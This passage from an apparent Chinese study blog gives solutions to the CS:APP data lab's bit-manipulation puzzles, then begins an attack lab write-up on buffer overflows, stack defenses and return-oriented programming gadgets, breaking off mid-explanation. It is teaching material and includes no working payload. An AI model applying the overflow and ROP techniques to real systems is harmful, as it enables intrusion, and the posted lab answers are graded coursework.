class="hljs-number">0x33</span>|(<span class="hljs-number">0x33</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_2=mask_2|(mask_2&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x33333333,即00110011···</span><br>  mask_4=<span class="hljs-number">0x0f</span>|(<span class="hljs-number">0x0f</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_4=mask_4|(mask_4&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x0f0f0f0f,即00001111···</span><br>  mask_8=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//0000000011111111 0000000011111111</span><br>  mask_16=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">8</span>);<span class="hljs-comment">//00000000000000001111111111111111</span><br>  x=(x&amp;mask_1)+((x&gt;&gt;<span class="hljs-number">1</span>)&amp;mask_1);<br>  x=(x&amp;mask_2)+((x&gt;&gt;<span class="hljs-number">2</span>)&amp;mask_2);<br>  <span class="hljs-comment">//下面三组最高位不会是1了 </span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">4</span>))&amp;mask_4;<span class="hljs-comment">//x=(x&amp;mask_4)+((x&gt;&gt;4)&amp;mask_4);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">8</span>))&amp;mask_8;<span class="hljs-comment">//x=(x&amp;mask_8)+((x&gt;&gt;8)&amp;mask_8);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">16</span>))&amp;mask_16;<span class="hljs-comment">//x=(x&amp;mask_16)+((x&gt;&gt;16)&amp;mask_16);</span><br>  <span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-bang"><a href="#5-bang" class="headerlink" title="5.bang"></a>5.bang</h2><p>不利用逻辑符号!求一个数的逻辑非，也就是判断该数的二进制位<strong>是否全为0</strong>，若全为0则返回1，否则返回0。</p><p>一个<strong>求补码</strong>的方法：<strong>从最低位到第一个1之间不变，其他位按位取反</strong>。</p><p>一个数与其补码相或后，只有0x00000000的结果最高位是0，其他数结果都是1，所以我们将原数与其补码相或后右移31位得到最高位，将最高位与1相与，结果为0说明原数是0，取反后输出1，否则说明原数不为0，取反后输出0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bang - Compute !x without using !</span><br><span class="hljs-comment"> *   Examples: bang(3) = 0, bang(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bang</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> ~((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-tmin"><a href="#6-tmin" class="headerlink" title="6.tmin"></a>6.tmin</h2><p>返回 最小的二进制补码，为0x 8000 0000，直接左移31位即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-fitsBits"><a href="#7-fitsBits" class="headerlink" title="7.fitsBits"></a>7.fitsBits</h2><p>判断一个数能否表示成n位的二进制，能则返回1，不能返回0</p><p>关键在于这个n位是包括符号位的，即对于一个整数，其最高位应为0，对于一个负数，最高位为1</p><p>先左移32-n 再右移32-n,考虑符号位，若与x相等则说明可以。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * fitsBits - return 1 if x can be represented as an </span><br><span class="hljs-comment"> * n-bit, two&#x27;s complement integer.</span><br><span class="hljs-comment"> * 1 &lt;= n &lt;= 32</span><br><span class="hljs-comment"> * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> * Max ops: 15</span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fitsBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> shiftNumber= <span class="hljs-number">32</span> + (~n + <span class="hljs-number">1</span>);<span class="hljs-comment">// 32 - n</span><br>   <span class="hljs-keyword">return</span> !(x^((x&lt;&lt;shiftNumber)&gt;&gt;shiftNumber));<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="8-divpwr2"><a href="#8-divpwr2" class="headerlink" title="8.divpwr2"></a>8.divpwr2</h2><p>将一个数除以2的n次方</p><p>除法是向下取整，正数位运算和除法运算相同，负数除法向0取整，位运算向下取整，<br> 所以要靠位运算来实现负数除法就要加一个偏置量，使其变成比原来的数小2^n个单位的数<br> 使得新数通过位运算的向下取整和原数的向0取整结果相同</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span><br><span class="hljs-comment"> *  Round toward zero</span><br><span class="hljs-comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">divpwr2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx=x&gt;&gt;<span class="hljs-number">31</span>;<br><span class="hljs-keyword">int</span> mask =(<span class="hljs-number">1</span>&lt;&lt;n)+(~<span class="hljs-number">0</span>);<br><span class="hljs-keyword">int</span> bias=signx&amp;mask;<br>    <span class="hljs-keyword">return</span> (bias+x)&gt;&gt;n;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-negate"><a href="#9-negate" class="headerlink" title="9.negate"></a>9.negate</h2><p>返回-x，很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-isPositive"><a href="#10-isPositive" class="headerlink" title="10.isPositive"></a>10.isPositive</h2><p>正数符号位为0，负数符号位为，0的符号位也是0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span><br><span class="hljs-comment"> *   Example: isPositive(-1) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isPositive</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> !(x&gt;&gt;<span class="hljs-number">31</span>|!x);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-isLessOrEqual"><a href="#11-isLessOrEqual" class="headerlink" title="11.isLessOrEqual"></a>11.isLessOrEqual</h2><p>这道题相当于枚举 x&lt;=y 的所有情况：<br> 1.x为负数，y 为正数<br> 2.x 等于 y<br> 3.x 和 y 符号相同，并且 y-x 为正数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx = (x&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> signy = (y&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> tmp = signx ^ signy;<br><span class="hljs-keyword">int</span> tmp1 = tmp &amp; signx;<span class="hljs-comment">//为1时表示x为负数，y为正数</span><br><span class="hljs-keyword">int</span> y_x=y+(~x+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> tmp1|(!(x^y))|(!tmp&amp;!(y_x&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="12-ilog2"><a href="#12-ilog2" class="headerlink" title="12.ilog2"></a>12.ilog2</h2><p>求一个数是2的几次幂，即求最高位的1的索引（0-31）</p><p>也是二分，先去掉后16位，先判断左边16位，若全是0，则!!(x&gt;&gt;16)返回0，否则返回1,1&lt;&lt;4则记录左边16位的最低位索引</p><p>若前16位中含1，则只保留了前16位，否则前16的0可以忽略，相当于考虑后16位</p><p>之后同理，将16位二分，然后记录索引。</p><p>全部索引相加就是结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span><br><span class="hljs-comment"> *   Example: ilog2(16) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 90</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ilog2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> bitsNumber = <span class="hljs-number">0</span>;<br>bitsNumber = (!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;<span class="hljs-comment">//去掉后16位，判断左边16位是否全为0，不是则记录左边16位的最低位索引</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">8</span>)) &lt;&lt; <span class="hljs-number">3</span>);<span class="hljs-comment">//判断左边16位是否全为0，不是则记录左边位8的最低位索引</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">4</span>)) &lt;&lt; <span class="hljs-number">2</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">2</span>)) &lt;&lt; <span class="hljs-number">1</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">1</span>)));<span class="hljs-comment">//</span><br><span class="hljs-keyword">return</span> bitsNumber;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-float-neg"><a href="#13-float-neg" class="headerlink" title="13.float_neg"></a>13.float_neg</h2><p>返回一个无符号浮点数的负的单精度浮点数表达，参数NaN（阶码全为1，小数域非0）时返回原值</p><p>关键在于NaN的判断，其他参数加上一个符号位即可；</p><p>((uf&gt;&gt;23)&amp;0xff)^0xff判断阶码是否全为1，是的话结果为0，!(uf&amp;((1&lt;&lt;23)-1))判断小数域是否全为0，是的话为1</p><p>所以代码含义就是：</p><p>if(不是NaN)加符号位</p><p>否则返回原参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_neg - Return bit-level equivalent of expression -f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representations of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_neg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((((uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>)^<span class="hljs-number">0xff</span>)||!(uf&amp;((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">23</span>)<span class="hljs-number">-1</span>))) uf=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^uf;<br><br>  <span class="hljs-keyword">return</span> uf;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="14-float-i2f"><a href="#14-float-i2f" class="headerlink" title="14.float_i2f"></a>14.float_i2f</h2><p>将一个int型数转化为浮点型。</p><p>问题重点在于考虑浮点数的舍入</p><ul><li><p>浮点数舍入规则</p><p>如果以形式1.RR..RDD..D表示浮点数（R表示有效位，或保留位，而D表示舍去位），舍入规则就是：</p><p>如果DD..D &lt; 10..0，则向下舍入</p><p>如果DD..D &gt; 10..0，则向上舍入</p><p>如要DD..D = 10..0，则向最近偶数舍入，细则如下 ：</p><p>a. 如果RR..R = XX..0 （最低有效位是0），则向下舍入</p><p>b. 如果RR..R = XX..1（最低有效位是1），则向上舍入</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span><br><span class="hljs-comment"> *   Result is returned as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_i2f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> shiftLeft=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> afterShift, tmp, flag;<br>    <span class="hljs-keyword">unsigned</span> absX=x;<br>    <span class="hljs-keyword">unsigned</span> sign=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//special case</span><br>    <span class="hljs-keyword">if</span> (x==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//if x &lt; 0, sign = 1000...,abs_x = -x</span><br>    <span class="hljs-keyword">if</span> (x&lt;<span class="hljs-number">0</span>)<span class="hljs-comment">//小于0，则取反</span><br>    &#123;<br>sign=<span class="hljs-number">0x80000000</span>;<br>absX=-x;<br>    &#125;<br>    afterShift=absX;<br>    <span class="hljs-comment">//count shift_left and after_shift</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//计算阶码E=32-shiftLeft，aftershift保留尾数的值</span><br>    &#123;<br>tmp=afterShift;<br>afterShift&lt;&lt;=<span class="hljs-number">1</span>;<br>shiftLeft++;<br><span class="hljs-keyword">if</span> (tmp &amp; <span class="hljs-number">0x80000000</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">//afterShift的前23位保留作为尾数，要考虑舍入</span><br>    <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x01ff</span>)&gt;<span class="hljs-number">0x0100</span>)<span class="hljs-comment">//进位</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x03ff</span>)==<span class="hljs-number">0x0300</span>)<span class="hljs-comment">//向偶数舍入</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>flag=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">return</span> sign +((<span class="hljs-number">127</span>+<span class="hljs-number">32</span>-shiftLeft)&lt;&lt;<span class="hljs-number">23</span>) +(afterShift&gt;&gt;<span class="hljs-number">9</span>) + flag;<br>    <span class="hljs-comment">//符号位+阶码+尾数+舍入值</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-float-twice"><a href="#15-float-twice" class="headerlink" title="15.float_twice"></a>15.float_twice</h2><p>返回一个无符号浮点数的两倍</p><p>对于非规格化数，尾数左移1位就相当于乘2</p><p>对于规格化数，阶码加一即可</p><p>对于NaN，返回原值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_twice</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)==<span class="hljs-number">0</span>)  <span class="hljs-comment">//阶码为0，非规格化数</span><br>uf=((uf&amp;<span class="hljs-number">0x007fffff</span>)&lt;&lt;<span class="hljs-number">1</span>)|(uf&amp;<span class="hljs-number">0x80000000</span>);<span class="hljs-comment">//尾数域左移一位，别忘了符号</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)!=<span class="hljs-number">0x7f800000</span>) <span class="hljs-comment">//不是NaN ，阶码不是全1 </span><br>uf=uf+<span class="hljs-number">0x800000</span>;<span class="hljs-comment">//阶码+1，2^(1+1)=2*2  </span><br>  <span class="hljs-keyword">return</span> uf;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="测试结果截图"><a href="#测试结果截图" class="headerlink" title="测试结果截图"></a>测试结果截图</h2><p><img src="/2021/07/04/lab2_datalab/image-20210407110327739.png" alt="image-20210407110327739"></p>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lab4_attack lab</title>
    <link href="/2021/07/02/Attack_lab/"/>
    <url>/2021/07/02/Attack_lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Attack-lab"><a href="#Attack-lab" class="headerlink" title="Attack lab"></a>Attack lab</h1><h2 id="实验概括"><a href="#实验概括" class="headerlink" title="实验概括"></a>实验概括</h2><p>要求你进行五次攻击。攻击方式是code injection代码注入和Reeturn-oriented programming(ROP)</p><p>文件列表：<br>|文件|用途|<br>| —- | —- |<br>|ctarget|用来做Code injection攻击的程序，phase1-3|<br>|rtarget|用来做ROP攻击的程序,phase 4-5|<br>|cookie.txt|作为攻击的标识符|<br>|hex2raw|用来生成工具字符串|<br>|farm.c|用于生成面向返回的编程攻击|</p><h2 id="预备知识——缓冲区溢出"><a href="#预备知识——缓冲区溢出" class="headerlink" title="预备知识——缓冲区溢出"></a>预备知识——缓冲区溢出</h2><p>缓冲区溢出的基本原理并不复杂。缓冲区就是操作系统为函数执行专门划分出的一段内存，包括栈(自动变量)、堆(动态内存)和静态数据区(全局或静态)。其中缓冲区溢出发生在栈里，栈存放了函数的参数、返回地址、EBP（EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码）和局部变量。</p><p><strong>当函数中对局部变量的赋值超过了为其分配的存储空间，超出的部分就会覆盖栈里其他部分的数据，也就是发生了缓冲区溢出</strong>。</p><p><img src="/2021/07/02/Attack_lab/14ce36d3d539b6000b87d3d293d6f22cc75cb793-1625283594106.jpeg" alt="img"></p><p><img src="/2021/07/02/Attack_lab/9213b07eca806538756b3e9fee5b6642af3482c2.jpeg" alt="img"></p><h2 id="预备知识——ROP攻击"><a href="#预备知识——ROP攻击" class="headerlink" title="预备知识——ROP攻击"></a>预备知识——ROP攻击</h2><h3 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h3><p>缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。</p><p>（1）<strong>栈随机化</strong></p><p><code>栈随机化</code>的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。</p><p>（2）<strong>栈破坏检测</strong></p><p>最近的GCC版本在产生的代码加入了一种<code>栈保护者</code>机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。</p><p>（3）<strong>限制可执行代码区域</strong></p><p>最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。</p><p>在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以<code>ret</code>结尾，这一段指令序列，我们称之为<code>gadget</code>。</p><p>每一段<code>gadget</code>包含一系列指令字节，而且以<code>ret</code>结尾，跳转到下一个<code>gadget</code>，就这样连续的执行一系列的指令代码，对程序造成攻击。</p><p><strong>示例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setval_210</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  *p = <span class="hljs-number">3347663060U</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000400f15 &lt;setval_210&gt;:<br>  400f15: c7 07 d4 48 89 c7 movl <span class="hljs-variable">$0xc78948d4</span>,(%rdi)<br>  400f1b: c3 retq<br></code></pre></td></tr></table></figure><p>其中，字节序列<code>48 89 c7</code>是对指令<code>movq %rax, 